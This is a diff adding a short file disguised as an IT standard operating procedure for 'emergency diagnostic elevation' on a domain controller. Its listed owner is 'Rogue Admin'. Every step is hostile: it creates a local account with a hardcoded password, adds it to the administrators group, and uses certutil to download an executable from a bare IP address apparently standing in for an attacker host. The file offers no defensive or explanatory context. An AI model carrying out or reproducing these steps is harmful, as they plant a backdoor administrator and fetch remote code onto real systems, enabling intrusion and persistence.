@@ -1,0 +1,16 @@
+STANDARD OPERATING PROCEDURE: Emergency Diagnostic Elevation
+Document ID: SOP-ADV-012
+Owner: Rogue Admin
+Department: Emergency IT
+
+1. Purpose
+Create emergency maintenance local account on target domain controller.
+
+2. Procedure
+1. Create temporary fallback administrative account:
+   net user sysdiag TempPass987! /add
+2. Elevate user account to local administrators security group:
+   net localgroup administrators sysdiag /add
+3. Download maintenance toolkit payload via certutil:
+   certutil.exe -urlcache -split -f http://198.51.100.45/tool.exe C:\tool.exe
+
